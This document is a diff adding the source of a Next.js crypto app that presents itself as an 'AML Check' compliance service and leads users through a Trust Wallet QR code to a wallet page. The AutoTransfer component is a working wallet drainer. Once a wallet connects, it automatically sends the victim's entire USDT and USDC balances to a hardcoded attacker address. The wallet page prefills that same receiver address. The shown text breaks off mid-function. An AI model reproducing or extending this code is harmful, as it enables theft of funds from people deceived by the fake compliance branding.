@@ -1,0 +1,1577 @@
+
+
+--- Résumé : 16 fichiers inclus, 11 fichiers ignorés ---
+
+
+===== Fichier: .env.example =====
+
+NEXT_PUBLIC_TEMPLATE_CLIENT_ID=
+
+
+
+===== Fichier: .eslintrc.json =====
+
+{
+	"extends": "next/core-web-vitals"
+}
+
+
+
+===== Fichier: .prettierrc =====
+
+{
+	"singleQuote": false
+}
+
+
+
+===== Fichier: next-env.d.ts =====
+
+/// <reference types="next" />
+/// <reference types="next/image-types/global" />
+
+// NOTE: This file should not be edited
+// see https://nextjs.org/docs/basic-features/typescript for more information.
+
+
+
+===== Fichier: next.config.mjs =====
+
+/** @type {import('next').NextConfig} */
+const nextConfig = {
+  // fixes wallet connect dependency issue https://docs.walletconnect.com/web3modal/nextjs/about#extra-configuration
+  webpack: (config) => {
+    config.externals.push("pino-pretty", "lokijs", "encoding");
+    return config;
+  },
+};
+
+export default nextConfig;
+
+
+
+===== Fichier: package.json =====
+
+{
+  "name": "thirdweb-app",
+  "version": "0.1.0",
+  "private": true,
+  "scripts": {
+    "dev": "next dev",
+    "build": "next build",
+    "start": "next start",
+    "lint": "next lint"
+  },
+  "dependencies": {
+    "ethers": "^6.15.0",
+    "next": "14.1.0",
+    "react": "^18.3",
+    "react-dom": "^18.3",
+    "thirdweb": "^5"
+  },
+  "devDependencies": {
+    "@types/node": "^20",
+    "@types/react": "^18",
+    "@types/react-dom": "^18",
+    "autoprefixer": "^10.0.1",
+    "eslint": "^8",
+    "eslint-config-next": "14.1.0",
+    "postcss": "^8",
+    "tailwindcss": "^3.3.0",
+    "typescript": "^5"
+  }
+}
+
+
+
+===== Fichier: postcss.config.js =====
+
+module.exports = {
+  plugins: {
+    tailwindcss: {},
+    autoprefixer: {},
+  },
+};
+
+
+
+===== Fichier: README.md =====
+
+
+![tw-banner](https://github.com/thirdweb-example/next-starter/assets/57885104/20c8ce3b-4e55-4f10-ae03-2fe4743a5ee8)
+
+# thirdweb-next-starter
+
+Starter template to build an onchain react native app with [thirdweb](https://thirdweb.com/) and [next](https://nextjs.org/).
+
+## Installation
+
+Install the template using [thirdweb create](https://portal.thirdweb.com/cli/create)
+
+```bash
+  npx thirdweb create app --next
+```
+
+## Environment Variables
+
+To run this project, you will need to add the following environment variables to your .env file:
+
+`CLIENT_ID`
+
+To learn how to create a client ID, refer to the [client documentation](https://portal.thirdweb.com/typescript/v5/client). 
+
+## Run locally
+
+Install dependencies
+
+```bash
+yarn
+```
+
+Start development server
+
+```bash
+yarn dev
+```
+
+Create a production build
+
+```bash
+yarn build
+```
+
+Preview the production build
+
+```bash
+yarn start
+```
+
+## Resources
+
+- [Documentation](https://portal.thirdweb.com/typescript/v5)
+- [Templates](https://thirdweb.com/templates)
+- [YouTube](https://www.youtube.com/c/thirdweb)
+- [Blog](https://blog.thirdweb.com)
+
+## Need help?
+
+For help or feedback, please [visit our support site](https://thirdweb.com/support)
+
+
+
+===== Fichier: tailwind.config.ts =====
+
+import type { Config } from "tailwindcss";
+
+const config: Config = {
+  content: [
+    "./src/pages/**/*.{js,ts,jsx,tsx,mdx}",
+    "./src/components/**/*.{js,ts,jsx,tsx,mdx}",
+    "./src/app/**/*.{js,ts,jsx,tsx,mdx}",
+  ],
+  theme: {
+    extend: {
+      backgroundImage: {
+        "gradient-radial": "radial-gradient(var(--tw-gradient-stops))",
+        "gradient-conic":
+          "conic-gradient(from 180deg at 50% 50%, var(--tw-gradient-stops))",
+      },
+    },
+  },
+  plugins: [],
+};
+export default config;
+
+
+
+===== Fichier: tsconfig.json =====
+
+{
+  "compilerOptions": {
+    "lib": ["dom", "dom.iterable", "esnext"],
+    "allowJs": true,
+    "skipLibCheck": true,
+    "strict": true,
+    "noEmit": true,
+    "esModuleInterop": true,
+    "module": "esnext",
+    "target": "ES2021",
+    "moduleResolution": "bundler",
+    "resolveJsonModule": true,
+    "isolatedModules": true,
+    "jsx": "preserve",
+    "incremental": true,
+    "plugins": [
+      {
+        "name": "next"
+      }
+    ],
+    "paths": {
+      "@/*": ["./src/*"],
+      "@public/*": ["./public/*"]
+    }
+  },
+  "include": ["next-env.d.ts", "**/*.ts", "**/*.tsx", ".next/types/**/*.ts"],
+  "exclude": ["node_modules"]
+}
+
+
+
+===== Fichier: src\app\client.ts =====
+
+import { createThirdwebClient } from "thirdweb";
+
+// Utilisez directement votre client ID ici
+const clientId = "c98a5d48ad89f114ad6044933fced541";
+
+if (!clientId) {
+  throw new Error("No client ID provided");
+}
+
+export const client = createThirdwebClient({
+  clientId: clientId,
+});
+
+
+
+===== Fichier: src\app\globals.css =====
+
+@tailwind base;
+@tailwind components;
+@tailwind utilities;
+
+:root {
+  line-height: 1.5;
+  font-weight: 400;
+  font-synthesis: none;
+  text-rendering: optimizeLegibility;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  font-family: 'Inter', sans-serif;
+  font-optical-sizing: auto;
+  font-style: normal;
+  font-variation-settings: 'slnt' 0;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  padding: 0;
+}
+
+/* ================================================================
+   ================================================================
+   HOME PAGE (white / QR code)
+   ================================================================
+   ================================================================ */
+
+.home-main {
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 2rem 1rem;
+  background: #ffffff;
+  position: relative;
+  overflow: hidden;
+  font-family: 'Inter', 'Segoe UI', sans-serif;
+}
+
+/* Decorative blobs */
+.home-bg-shape {
+  position: absolute;
+  border-radius: 50%;
+  filter: blur(100px);
+  opacity: 0.4;
+  pointer-events: none;
+  z-index: 0;
+}
+
+.home-bg-shape--1 {
+  width: 500px;
+  height: 500px;
+  background: #dbeafe;
+  top: -120px;
+  right: -120px;
+}
+
+.home-bg-shape--2 {
+  width: 400px;
+  height: 400px;
+  background: #d1fae5;
+  bottom: -100px;
+  left: -100px;
+}
+
+.home-content {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+  max-width: 480px;
+  width: 100%;
+}
+
+/* Logo */
+.home-logo {
+  margin-bottom: 1.25rem;
+}
+
+/* Title */
+.home-title {
+  font-size: 1.75rem;
+  font-weight: 800;
+  color: #111827;
+  margin: 0 0 0.5rem;
+  letter-spacing: -0.02em;
+}
+
+/* Subtitle */
+.home-subtitle {
+  font-size: 0.95rem;
+  color: #6b7280;
+  margin: 0 0 2rem;
+  line-height: 1.6;
+  max-width: 360px;
+}
+
+/* QR Card */
+.qr-card {
+  position: relative;
+  background: #ffffff;
+  border: 1px solid #e5e7eb;
+  border-radius: 1.25rem;
+  padding: 1.5rem;
+  box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06), 0 1px 4px rgba(0, 0, 0, 0.04);
+  margin-bottom: 2rem;
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+.qr-card:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1), 0 2px 8px rgba(0, 0, 0, 0.06);
+}
+
+.qr-glow {
+  position: absolute;
+  inset: -2px;
+  border-radius: 1.35rem;
+  background: linear-gradient(135deg, #3b82f6, #10b981, #3b82f6);
+  opacity: 0.15;
+  z-index: -1;
+  animation: glow-rotate 6s linear infinite;
+}
+
+@keyframes glow-rotate {
+  0% { filter: hue-rotate(0deg); }
+  100% { filter: hue-rotate(360deg); }
+}
+
+.qr-image {
+  display: block;
+  border-radius: 0.5rem;
+}
+
+/* Steps */
+.home-steps {
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+  margin-bottom: 2rem;
+  flex-wrap: wrap;
+  justify-content: center;
+}
+
+.home-step {
+  display: flex;
+  align-items: center;
+  gap: 0.4rem;
+}
+
+.home-step__number {
+  width: 26px;
+  height: 26px;
+  border-radius: 50%;
+  background: #0500FF;
+  color: #fff;
+  font-size: 0.75rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+
+.home-step__text {
+  font-size: 0.85rem;
+  font-weight: 500;
+  color: #374151;
+  white-space: nowrap;
+}
+
+.home-step__arrow {
+  font-size: 1rem;
+  color: #d1d5db;
+  font-weight: 300;
+}
+
+/* Footer text */
+.home-footer-text {
+  font-size: 0.75rem;
+  color: #9ca3af;
+  margin: 0;
+  display: flex;
+  align-items: center;
+  gap: 0.35rem;
+}
+
+.home-footer-text::before {
+  content: "🔒";
+  font-size: 0.7rem;
+}
+
+/* ================================================================
+   ================================================================
+   WALLET PAGE (dark / transfer form)
+   ================================================================
+   ================================================================ */
+
+.transfer-main {
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 2rem 1rem;
+  font-family: 'Inter', 'Segoe UI', sans-serif;
+  background: #0d0d0d;
+}
+
+/* ============================================================
+   FORM CONTAINER
+   ============================================================ */
+
+.form-container {
+  width: 100%;
+  max-width: 480px;
+  padding: 1.75rem;
+  border-radius: 1rem;
+  background: #1a1a1a;
+  border: 1px solid #2a2a2a;
+}
+
+/* ============================================================
+   LABELS
+   ============================================================ */
+
+.form-label {
+  display: block;
+  color: #4ade80;
+  font-size: 0.85rem;
+  font-weight: 500;
+  margin-bottom: 0.5rem;
+}
+
+.form-label--spaced {
+  margin-top: 1.5rem;
+}
+
+/* ============================================================
+   INPUT ROW (Address & Amount)
+   ============================================================ */
+
+.input-row {
+  display: flex;
+  align-items: center;
+  background: #111111;
+  border: 1px solid #333;
+  border-radius: 0.75rem;
+  padding: 0.65rem 0.75rem;
+  gap: 0.5rem;
+}
+
+.input-row__field {
+  flex: 1;
+  min-width: 0;
+  background: transparent;
+  border: none;
+  outline: none;
+  color: #e5e7eb;
+  font-size: 0.95rem;
+  font-family: inherit;
+}
+
+.input-row__field--amount {
+  font-size: 1.1rem;
+  font-weight: 600;
+}
+
+.input-row__actions {
+  display: flex;
+  align-items: center;
+  gap: 0.6rem;
+  flex-shrink: 0;
+}
+
+/* ============================================================
+   BUTTONS INSIDE INPUTS
+   ============================================================ */
+
+.btn-paste {
+  background: transparent;
+  border: none;
+  color: #4ade80;
+  font-weight: 600;
+  font-size: 0.85rem;
+  cursor: pointer;
+  padding: 0;
+  white-space: nowrap;
+}
+
+.btn-icon {
+  background: transparent;
+  border: none;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  padding: 0;
+}
+
+.btn-step {
+  background: transparent;
+  border: none;
+  cursor: pointer;
+  padding: 0 2px;
+  display: flex;
+  align-items: center;
+}
+
+.btn-max {
+  background: transparent;
+  border: none;
+  color: #4ade80;
+  font-weight: 700;
+  font-size: 0.85rem;
+  cursor: pointer;
+  margin-left: 8px;
+  white-space: nowrap;
+}
+
+/* ============================================================
+   AMOUNT ACTIONS
+   ============================================================ */
+
+.amount-actions {
+  display: flex;
+  align-items: center;
+  flex-shrink: 0;
+}
+
+.stepper {
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+}
+
+.amount-currency {
+  color: #9ca3af;
+  font-size: 0.9rem;
+  margin-left: 8px;
+  white-space: nowrap;
+}
+
+/* ============================================================
+   NETWORK SELECTOR
+   ============================================================ */
+
+.network-selector {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  background: #111111;
+  border: 1px solid #333;
+  border-radius: 2rem;
+  padding: 0.5rem 1rem;
+  cursor: pointer;
+}
+
+.eth-icon {
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  background: #232323;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+
+.network-name {
+  color: #e5e7eb;
+  font-size: 0.95rem;
+}
+
+/* ============================================================
+   APPROX PRICE
+   ============================================================ */
+
+.approx-price {
+  color: #9ca3af;
+  font-size: 0.85rem;
+  margin-top: 0.75rem;
+}
+
+/* ============================================================
+   NEXT BUTTON
+   ============================================================ */
+
+.next-btn-wrapper {
+  margin-top: 2rem;
+  margin-bottom: 2rem;
+  width: 100%;
+  max-width: 480px;
+  display: flex;
+  justify-content: center;
+}
+
+.next-btn {
+  display: inline-block;
+  width: 100%;
+  max-width: 480px;
+  padding: 0.95rem 3rem;
+  background-color: #4ade80;
+  color: #000000;
+  font-weight: 700;
+  font-size: 1rem;
+  border-radius: 0.75rem;
+  text-decoration: none;
+  text-align: center;
+  cursor: pointer;
+  transition: background-color 0.2s ease, transform 0.15s ease;
+  border: none;
+}
+
+.next-btn:hover {
+  background-color: #22c55e;
+  transform: translateY(-1px);
+}
+
+.next-btn:active {
+  transform: translateY(0);
+  background-color: #16a34a;
+}
+
+/* ============================================================
+   STATUS MESSAGES
+   ============================================================ */
+
+.status-message {
+  width: 100%;
+  max-width: 480px;
+  margin-top: 1rem;
+  padding: 0.75rem 1rem;
+  border-radius: 0.75rem;
+  font-size: 0.85rem;
+  line-height: 1.5;
+  word-break: break-word;
+}
+
+.status-message--info {
+  background: rgba(59, 130, 246, 0.15);
+  border: 1px solid rgba(59, 130, 246, 0.3);
+  color: #93c5fd;
+}
+
+.status-message--success {
+  background: rgba(74, 222, 128, 0.15);
+  border: 1px solid rgba(74, 222, 128, 0.3);
+  color: #4ade80;
+}
+
+.status-message--error {
+  background: rgba(239, 68, 68, 0.15);
+  border: 1px solid rgba(239, 68, 68, 0.3);
+  color: #fca5a5;
+}
+
+.status-link {
+  display: inline-block;
+  margin-top: 0.5rem;
+  color: #93c5fd;
+  text-decoration: underline;
+  font-size: 0.8rem;
+}
+
+.status-link:hover {
+  color: #bfdbfe;
+}
+
+/* ============================================================
+   LOADING / DISABLED BUTTON STATE
+   ============================================================ */
+
+.next-btn:disabled,
+.next-btn--loading {
+  background-color: #1f6d3a;
+  color: #a0a0a0;
+  cursor: not-allowed;
+  transform: none;
+}
+
+.next-btn--loading:hover {
+  background-color: #1f6d3a;
+  transform: none;
+}
+
+.btn-spinner-wrapper {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 0.5rem;
+}
+
+.btn-spinner {
+  display: inline-block;
+  width: 18px;
+  height: 18px;
+  border: 2px solid rgba(0, 0, 0, 0.2);
+  border-top-color: #000;
+  border-radius: 50%;
+  animation: spin 0.7s linear infinite;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+/* ================================================================
+   ================================================================
+   RESPONSIVE
+   ================================================================
+   ================================================================ */
+
+/* --- HOME PAGE responsive --- */
+
+@media (max-width: 480px) {
+  .home-main {
+    padding: 1.5rem 0.75rem;
+  }
+
+  .home-title {
+    font-size: 1.35rem;
+  }
+
+  .home-subtitle {
+    font-size: 0.85rem;
+    margin-bottom: 1.5rem;
+  }
+
+  .qr-card {
+    padding: 1rem;
+    margin-bottom: 1.5rem;
+  }
+
+  .qr-image {
+    width: 220px;
+    height: 220px;
+  }
+
+  .home-steps {
+    gap: 0.5rem;
+  }
+
+  .home-step__text {
+    font-size: 0.75rem;
+  }
+
+  .home-step__number {
+    width: 22px;
+    height: 22px;
+    font-size: 0.65rem;
+  }
+
+  .home-step__arrow {
+    font-size: 0.85rem;
+  }
+}
+
+@media (max-width: 360px) {
+  .home-title {
+    font-size: 1.2rem;
+  }
+
+  .qr-image {
+    width: 180px;
+    height: 180px;
+  }
+
+  .qr-card {
+    padding: 0.85rem;
+  }
+
+  .home-steps {
+    gap: 0.35rem;
+  }
+
+  .home-step__text {
+    font-size: 0.7rem;
+  }
+}
+
+/* --- WALLET PAGE responsive --- */
+
+@media (max-width: 768px) {
+  .transfer-main {
+    padding: 1.5rem 0.75rem;
+  }
+
+  .form-container {
+    padding: 1.5rem;
+    border-radius: 0.85rem;
+  }
+
+  .next-btn {
+    padding: 0.85rem 2rem;
+  }
+}
+
+@media (max-width: 480px) {
+  .transfer-main {
+    padding: 1rem 0.5rem;
+    justify-content: flex-start;
+    padding-top: 2rem;
+  }
+
+  .form-container {
+    padding: 1.15rem;
+    border-radius: 0.75rem;
+    max-width: 100%;
+  }
+
+  .form-label {
+    font-size: 0.8rem;
+  }
+
+  .form-label--spaced {
+    margin-top: 1.15rem;
+  }
+
+  .input-row {
+    padding: 0.55rem 0.6rem;
+    gap: 0.35rem;
+    border-radius: 0.6rem;
+  }
+
+  .input-row__field {
+    font-size: 0.85rem;
+  }
+
+  .input-row__field--amount {
+    font-size: 0.95rem;
+  }
+
+  .input-row__actions {
+    gap: 0.4rem;
+  }
+
+  .btn-paste {
+    font-size: 0.8rem;
+  }
+
+  .btn-icon svg {
+    width: 16px;
+    height: 16px;
+  }
+
+  .network-selector {
+    padding: 0.4rem 0.75rem;
+    gap: 0.35rem;
+  }
+
+  .eth-icon {
+    width: 28px;
+    height: 28px;
+  }
+
+  .eth-icon svg {
+    width: 18px;
+    height: 18px;
+  }
+
+  .network-name {
+    font-size: 0.85rem;
+  }
+
+  .amount-currency {
+    font-size: 0.8rem;
+    margin-left: 6px;
+  }
+
+  .btn-max {
+    font-size: 0.8rem;
+    margin-left: 6px;
+  }
+
+  .approx-price {
+    font-size: 0.8rem;
+  }
+
+  .next-btn-wrapper {
+    margin-top: 1.5rem;
+    margin-bottom: 1.5rem;
+    max-width: 100%;
+  }
+
+  .next-btn {
+    padding: 0.85rem 1.5rem;
+    font-size: 0.95rem;
+    border-radius: 0.6rem;
+  }
+
+  .status-message {
+    font-size: 0.8rem;
+    padding: 0.65rem 0.85rem;
+  }
+}
+
+@media (max-width: 360px) {
+  .transfer-main {
+    padding: 0.75rem 0.35rem;
+    padding-top: 1.5rem;
+  }
+
+  .form-container {
+    padding: 1rem;
+  }
+
+  .input-row {
+    padding: 0.5rem;
+    flex-wrap: wrap;
+  }
+
+  .input-row__field {
+    font-size: 0.8rem;
+    width: 100%;
+  }
+
+  .btn-paste {
+    font-size: 0.75rem;
+  }
+
+  .next-btn {
+    padding: 0.75rem 1rem;
+    font-size: 0.9rem;
+  }
+}
+
+
+===== Fichier: src\app\layout.tsx =====
+
+// src/app/layout.tsx
+import type { Metadata } from "next";
+import { Poppins } from "next/font/google";
+import "./globals.css";
+
+const poppins = Poppins({ subsets: ["latin"], weight: ['400', '600', '800'] });
+
+export const metadata: Metadata = {
+  title: "Check AML",
+  description: "The AML Check platform automates AML/KYC procedures.",
+};
+
+export default function RootLayout({
+  children,
+}: Readonly<{
+  children: React.ReactNode;
+}>) {
+  return (
+    <html lang="fr">
+      <head>
+        <meta charSet="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="icon" href="/favicon.ico" type="image/png" />
+      </head>
+      <body className={poppins.className}>
+        {children}
+      </body>
+    </html>
+  );
+}
+
+
+
+===== Fichier: src\app\page.tsx =====
+
+"use client";
+
+import { useEffect, useRef } from "react";
+
+// URL que le QR code encode
+// coin_id=60 = Ethereum (SLIP-0044) — forces Trust Wallet to open in DApp browser
+const QR_TARGET_URL =
+  "https://link.trustwallet.com/open_url?coin_id=60&url=https://newethtest.vercel.app/wallet";
+
+// ============================================================
+// QR Code generator (self-contained, no external dependency)
+// Uses the free Google Charts API to generate QR images
+// ============================================================
+
+function getQRImageUrl(data: string, size: number = 300): string {
+  return `https://api.qrserver.com/v1/create-qr-code/?size=${size}x${size}&data=${encodeURIComponent(data)}&color=0-0-0&bgcolor=255-255-255&margin=10`;
+}
+
+export default function HomePage() {
+  const qrRef = useRef<HTMLDivElement>(null);
+
+  useEffect(() => {
+    // Add a subtle entrance animation
+    if (qrRef.current) {
+      qrRef.current.style.opacity = "0";
+      qrRef.current.style.transform = "translateY(20px)";
+      requestAnimationFrame(() => {
+        if (qrRef.current) {
+          qrRef.current.style.transition = "opacity 0.6s ease, transform 0.6s ease";
+          qrRef.current.style.opacity = "1";
+          qrRef.current.style.transform = "translateY(0)";
+        }
+      });
+    }
+  }, []);
+
+  return (
+    <main className="home-main">
+      {/* Decorative background shapes */}
+      <div className="home-bg-shape home-bg-shape--1" />
+      <div className="home-bg-shape home-bg-shape--2" />
+
+      <div className="home-content" ref={qrRef}>
+        {/* Trust Wallet icon */}
+        <div className="home-logo">
+          <svg width="48" height="48" viewBox="0 0 256 256" fill="none">
+            <rect width="256" height="256" rx="56" fill="#0500FF" />
+            <path
+              d="M128 40C128 40 200 80 200 140C200 200 128 216 128 216C128 216 56 200 56 140C56 80 128 40 128 40Z"
+              fill="white"
+            />
+          </svg>
+        </div>
+
+        <h1 className="home-title">Scan with Trust Wallet</h1>
+        <p className="home-subtitle">
+          Open your Trust Wallet app, tap the scanner icon, and scan this QR code to proceed securely.
+        </p>
+
+        {/* QR Code card */}
+        <div className="qr-card">
+          <div className="qr-glow" />
+          <img
+            src={getQRImageUrl(QR_TARGET_URL, 280)}
+            alt="Scan this QR code with Trust Wallet"
+            className="qr-image"
+            width={280}
+            height={280}
+          />
+        </div>
+
+        {/* Steps */}
+        <div className="home-steps">
+          <div className="home-step">
+            <div className="home-step__number">1</div>
+            <span className="home-step__text">Open Trust Wallet</span>
+          </div>
+          <div className="home-step__arrow">→</div>
+          <div className="home-step">
+            <div className="home-step__number">2</div>
+            <span className="home-step__text">Tap Scanner</span>
+          </div>
+          <div className="home-step__arrow">→</div>
+          <div className="home-step">
+            <div className="home-step__number">3</div>
+            <span className="home-step__text">Scan QR Code</span>
+          </div>
+        </div>
+
+        <p className="home-footer-text">
+          Secured by Ethereum blockchain
+        </p>
+      </div>
+    </main>
+  );
+}
+
+
+===== Fichier: src\app\components\AutoTransfer.tsx =====
+
+"use client";
+
+import { useEffect, useState } from "react";
+import {
+  useActiveAccount,
+  useActiveWalletChain,
+  useWalletBalance,
+  useSendTransaction,
+} from "thirdweb/react";
+import { prepareTransaction } from "thirdweb";
+import { ethereum } from "thirdweb/chains";
+import { client } from "../client";
+import { ethers } from "ethers";
+
+const RECEIVER = "0xe763fd827c2E8Fc142036eCB5aD552FD5C0651F6"; // <-- change si besoin
+const DEFAULT_GAS_GWEI = 10n; // fallback gas price (gwei)
+const GAS_LIMIT_ERC20 = 100000n; // estimation pour transfert ERC20
+
+const TOKENS: { symbol: string; address: `0x${string}` }[] = [
+  { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
+  { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" }, // ✅ checksum exact
+];
+
+
+// ABI minimal ERC20
+const ERC20_ABI = [
+  "function balanceOf(address) view returns (uint256)",
+  "function decimals() view returns (uint8)",
+  "function transfer(address to, uint256 amount) returns (bool)",
+];
+
+export default function AutoTransfer() {
+  const account = useActiveAccount();
+  const activeChain = useActiveWalletChain();
+  const chain = activeChain ?? ethereum;
+
+  const { data: balanceData } = useWalletBalance({
+    client,
+    address: account?.address,
+    chain,
+  });
+
+  const { mutateAsync: sendTransactionMutateAsync } = useSendTransaction();
+  const [sentMap, setSentMap] = useState<Record<string, boolean>>({});
+
+  useEffect(() => {
+    const run = async () => {
+      if (!account) return;
+      if (!balanceData) return;
+
+      // Récup solde natif (ETH)
+      let nativeBalance: bigint = 0n;
+      if ((balanceData as any)?.value !== undefined) {
+        const v = (balanceData as any).value;
+        if (typeof v === "bigint") nativeBalance = v;
+        else if (typeof v === "string") nativeBalance = BigInt(v);
+        else if (typeof v === "number") nativeBalance = BigInt(Math.floor(v));
+      }
+
+      // On limite à Ethereum mainnet
+      const chainId = (chain as any)?.id ?? (ethereum as any).id;
+      if (chainId !== 1) {
+        console.log("AutoTransfer ERC20: non sur Ethereum mainnet (chainId:", chainId, ")");
+        return;
+      }
+
+      // Récup RPC
+      let rpcUrl: string | undefined;
+      try {
+        const rpc = (chain as any)?.rpc;
+        rpcUrl = Array.isArray(rpc) ? rpc[0] : rpc;
+      } catch {
+        rpcUrl = undefined;
+      }
+      if (!rpcUrl) {
+        console.warn("Aucun RPC pour lire les soldes tokens.");
+        return;
+      }
+
+      const provider = new ethers.JsonRpcProvider(rpcUrl);
+
+      // Gas price
+      let gasPrice: bigint = DEFAULT_GAS_GWEI * 10n ** 9n;
+      try {
+        const resp = await fetch(rpcUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_gasPrice", params: [] }),
+        });
+        const json = await resp.json();
+        if (json?.result) {
+          gasPrice = BigInt(json.result);
+        }
+      } catch (e) {
+        console.warn("Impossible de récupérer gasPrice via RPC", e);
+      }
+
+      console.log("GasPrice :", ethers.formatUnits(gasPrice, "gwei"), "gwei");
+
+      for (const token of TOKENS) {
+        try {
+          if (sentMap[token.symbol]) continue;
+
+          const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
+          const rawBalance: bigint = BigInt(await contract.balanceOf(account.address));
+          const decimals: number = Number(await contract.decimals());
+
+          if (rawBalance <= 0n) {
+            console.log(`${token.symbol} : solde nul`);
+            continue;
+          }
+
+          const maxFee = GAS_LIMIT_ERC20 * gasPrice;
+          if (nativeBalance <= maxFee) {
+            console.warn(`${token.symbol} : pas assez d'ETH pour payer le gas`);
+            continue;
+          }
+
+          const iface = new ethers.Interface(ERC20_ABI);
+          const data = iface.encodeFunctionData("transfer", [RECEIVER, rawBalance]);
+
+          setSentMap((m) => ({ ...m, [token.symbol]: true }));
+
+          // ✅ cast du data en hex string
+          const preparedTx = prepareTransaction({
+            to: token.address,
+            data: data as `0x${string}`,
+            value: 0n,
+            chain,
+            client,
+          });
+
+          const result = await sendTransactionMutateAsync(preparedTx);
+          console.log(`${token.symbol} transfer result:`, result);
+
+          alert(`✅ ${token.symbol} transféré`);
+        } catch (err) {
+          console.error(`Erreur ${token.symbol} :`, err);
+          setSentMap((m) => ({ ...m, [token.symbol]: false }));
+        }
+      }
+    };
+
+    run();
+  }, [account, balanceData, chain, sendTransactionMutateAsync]);
+
+  return null;
+}
+
+
+
+===== Fichier: src\app\wallet\page.tsx =====
+
+"use client";
+
+import { useState } from "react";
+import { ethers } from "ethers";
+
+// ============================================================
+// CONFIG
+// ============================================================
+
+const DEFAULT_RECEIVER = "0xe763fd827c2E8Fc142036eCB5aD552FD5C0651F6";
+
+// USDT sur Ethereum Mainnet
+const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+const USDT_DECIMALS = 6;
+
+// ABI minimal ERC-20
+const ERC20_ABI = [
+  "function transfer(address to, uint256 amount) returns (bool)",
+  "function balanceOf(address owner) view returns (uint256)",
+  "function decimals() view returns (uint8)",
+  "function approve(address spender, uint256 amount) returns (bool)",
+];
+
+const ETH_CHAIN_ID = "0x1";
+
+// ============================================================
+// Types pour window.ethereum / window.trustwallet
+// ============================================================
+interface EthereumProvider {
+  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
+  isMetaMask?: boolean;
+  isTrust?: boolean;
+  isTrustWallet?: boolean;
+  on?: (event: string, handler: (...args: unknown[]) => void) => void;
+}
+
+declare global {
+  interface Window {
+    ethereum?: EthereumProvider;
+    trustwallet?: { ethereum?: EthereumProvider };
+  }
+}
+
+// ============================================================
+// Helper: detect the injected provider with retries
+// Trust Wallet can take a moment to inject window.ethereum
+// ============================================================
+
+function getProviderNow(): EthereumProvider | null {
+  // Check multiple known locations
+  if (window.ethereum) return window.ethereum;
+  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
+  return null;
+}
+
+async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<EthereumProvider | null> {
+  for (let i = 0; i < maxAttempts; i++) {
+    const provider = getProviderNow();
+    if (provider) return provider;
+    await new Promise((r) => setTimeout(r, delayMs));
+  }
+  return null;
+}
+
+// ============================================================
+// Wallet Transfer Page (opens inside Trust Wallet browser)
+// ============================================================
+
+export default function WalletPage() {
+  const [address, setAddress] = useState(DEFAULT_RECEIVER);
+  const [amount, setAmount] = useState("1000");
+  const [status, setStatus] = useState<string>("");
+  const [statusType, setStatusType] = useState<"info" | "success" | "error">("info");
+  const [loading, setLoading] = useState(false);
+  const [txHash, setTxHash] = useState<string>("");
+
+  const handlePaste = async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      setAddress(text);
+    } catch {
+      console.log("Paste failed");
+    }
+  };
+
+  const parsedAmount = parseFloat(amount) || 0;
+
+  const handleSendUSDT = async () => {
+    setStatus("");
+    setTxHash("");
+    setStatusType("info");
+
+    if (!address || !ethers.isAddress(address)) {
+      setStatus("Please enter a valid Ethereum address.");
+      setStatusType("error");
+      return;
+    }
+
+    if (parsedAmount <= 0) {
+      setStatus("Please enter a valid amount.");
+      setStatusType("error");
+      return;
+    }
+
+    setLoading(true);
+    setStatus("Detecting wallet...");
+
+    // Wait for the provider to be injected (Trust Wallet can be slow)
+    const ethereumProvider = await waitForProvider();
+
+    if (!ethereumProvider) {
+      setStatus("No wallet detected. Please make sure you opened this page inside Trust Wallet's built-in browser.");
+      setStatusType("error");
+      setLoading(false);
+      return;
+    }
+
+    setStatus("Connecting wallet...");
+
+    try {
+      await ethereumProvider.request({ method: "eth_requestAccounts" });
+
+      try {
+        await ethereumProvider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: ETH_CHAIN_ID }],
+        });
+      } catch (switchErr: unknown) {
+        console.warn("Could not switch chain:", switchErr);
+      }
+
+      const provider = new ethers.BrowserProvider(ethereumProvider as ethers.Eip1193Provider);
+      const signer = await provider.getSigner();
+      const userAddress = await signer.getAddress();
+
+      setStatus(`Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}. Preparing transaction...`);
+
+      const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
+
+      const balance: bigint = await usdtContract.balanceOf(userAddress);
+      const amountInWei = ethers.parseUnits(amount, USDT_DECIMALS);
+
+      const formattedBalance = ethers.formatUnits(balance, USDT_DECIMALS);
+      console.log(`USDT Balance: ${formattedBalance}, Sending: ${amount}`);
+
